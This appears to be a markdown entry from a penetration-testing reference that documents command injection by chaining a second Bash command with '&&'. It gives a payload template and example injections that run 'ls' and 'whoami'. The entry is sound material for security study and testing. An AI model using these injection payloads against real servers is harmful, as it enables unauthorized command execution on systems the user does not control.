---
type: command
executor: bash
data: original_cmd_by_server && ls
tags:
  - command-injection
  - chaining
platforms:
  - Linux
verified: true
validated: true
---

# bash-chain-commands-with-and

## Command

```bash
original_cmd_by_server && $_INJECTED_COMMAND
```

## Description

Chains two Bash commands using `&&`, executing the second only if the first succeeds. In injection, `original_cmd_by_server` is the vulnerable command; inject after it for conditional execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_INJECTED_COMMAND | Command to run on success (e.g., ls, whoami) | Yes |

## Examples

### Basic Usage

```bash
ping 127.0.0.1 && ls
```

### Advanced Usage

```bash
ping 127.0.0.1 && whoami > /tmp/output.txt
```

## Expected Output

If first succeeds: Output of original + injected command (e.g., ping stats followed by directory list).

## Related

- [[procedures/Command-Injection-Chaining-Commands]]
